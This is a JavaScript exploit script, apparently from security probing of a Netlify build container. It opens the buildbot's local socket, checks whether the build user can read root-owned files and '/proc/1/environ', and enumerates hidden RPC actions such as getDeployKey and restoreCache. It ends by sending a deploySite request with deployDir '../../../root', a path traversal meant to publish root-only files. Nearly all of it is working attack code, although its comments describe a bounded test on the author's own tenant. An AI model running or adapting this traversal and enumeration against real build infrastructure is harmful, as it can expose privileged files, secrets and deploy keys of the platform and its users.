// agentdeep-7 — buildbot socket RPC surface enumeration + deployDir traversal.
// Own tenant (nl2), own container, bounded: fresh connection per action, 4s cap each,
// 300ms spacing. NEVER sends a valid normal deploySite until the LAST step (traversal),
// and that one targets /root (root-only, harmless content) on OUR site.
import fs from 'node:fs';
import net from 'node:net';

const R = { probe: 'agentdeep-7', t: new Date().toISOString() };
const cap = (v, n = 2000) => (typeof v === 'string' && v.length > n ? v.slice(0, n) + '..TRUNC' : v);
const flush = () => { try { fs.writeFileSync('pubdir/agentdeep7.json', JSON.stringify(R, null, 1)); } catch {} };
fs.mkdirSync('pubdir', { recursive: true });

const SOCK = '/tmp/netlify-buildbot-socket';

// controls first: prove build uid CANNOT read the traversal targets
R.controls = {};
for (const p of ['/root/.bashrc', '/root', '/proc/1/environ']) {
  try { const st = fs.statSync(p); let read = 'READABLE';
    try { fs.readFileSync(p); } catch (e) { read = 'EACCES-read ' + String(e.code || e).slice(0, 30); }
    R.controls[p] = { stat: 'ok', mode: st.mode.toString(8), uid: st.uid, read };
  } catch (e) { R.controls[p] = { statErr: String(e.code || e).slice(0, 40) }; }
}
flush();

// socket ask: connect, optionally wait for greeting, send one JSON payload, read first response
const ask = (payload, { greet = 800, wait = 4000, silent = false } = {}) => new Promise((res) => {
  let done = false; const parts = []; let greeted = null;
  const finish = (v) => { if (done) return; done = true; try { c.destroy(); } catch {} res(v); };
  const c = net.createConnection(SOCK, () => {
    if (silent) return;
    setTimeout(() => {
      if (done) return;
      try { c.write(JSON.stringify(payload)); } catch (e) { finish({ writeErr: String(e).slice(0, 80) }); }
    }, greet);
  });
  c.on('data', (d) => {
    parts.push(d.toString());
    if (greeted === null) greeted = 'spoke-first:' + cap(d.toString(), 120);
    // respond after first data chunk (protocol is single request -> single response)
    setTimeout(() => {
      const raw = parts.join('');
      let j = null; try { j = JSON.parse(raw); } catch {}
      finish({ raw: cap(raw), json: j, greeted });
    }, 250);
  });
  c.on('error', (e) => finish({ err: String(e).slice(0, 100) }));
  c.on('close', () => finish({ closedNoData: true, parts: parts.length, greeted }));
  setTimeout(() => finish({ timeout: true, parts: parts.length, greeted }), silent ? wait : greet + wait);
});

// A) server-greeting check: connect and stay silent 1.5s
R.greeting = await ask(null, { silent: true, wait: 1500 }).catch((e) => String(e));
flush();

// B) action-name oracle matrix (unknown actions only — stateless)
const CANDIDATES = [
  'getDeployKey', 'GetDeployKey', 'deployKey', 'listDeployKeys', 'ListDeployKeys',
  'createDeployKey', 'CreateDeployKey', 'deleteDeployKey', 'DeleteDeployKey',
  'saveCache', 'uploadCache', 'cacheKey', 'getCache', 'restoreCache', 'purgeCache', 'clearCache',
  'getState', 'saveState', 'uploadFunctions', 'deployFunctions', 'deployEdgeFunctions',
  'ping', 'status', 'health', 'version', 'getVersion', 'handshake', 'auth', 'identify',
];
R.oracle = {};
for (const a of CANDIDATES) {
  R.oracle[a] = await ask({ action: a });
  flush();
  await new Promise((r) => setTimeout(r, 300));
}

// C) malformed deploySite (missing fields) — error shape, still no real deploy
R.malformedDeploy = await ask({ action: 'deploySite' });
flush();

// D) traversal: does the ROOT daemon resolve deployDir outside the repo root?
// Target /root — root-only, harmless content (.bashrc). Proof = succeeded + file list later.
R.preTraversalNote = 'results flushed; if this deploy succeeds the file list on the deploy is the proof';
flush();
R.traversalRoot = await ask({ action: 'deploySite', deployDir: '../../../root', environment: [] });
flush();

R.done = new Date().toISOString();
flush();
console.log('agentdeep-7 done', JSON.stringify(R.traversalRoot));
